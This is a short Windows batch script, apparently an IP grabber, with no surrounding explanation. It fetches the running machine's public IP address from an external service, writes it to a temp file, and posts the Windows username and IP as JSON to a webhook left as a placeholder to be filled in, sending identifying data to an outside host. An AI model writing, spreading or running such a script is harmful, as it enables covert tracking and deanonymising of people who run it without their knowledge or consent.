@echo off
set webhook=!! REPLACE ME !!
curl -s -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
curl -s -X POST -H "Content-type: application/json" --data "{\"content\": \"%USERNAME% : %ip%\"}" %webhook%
echo Completed!
pause
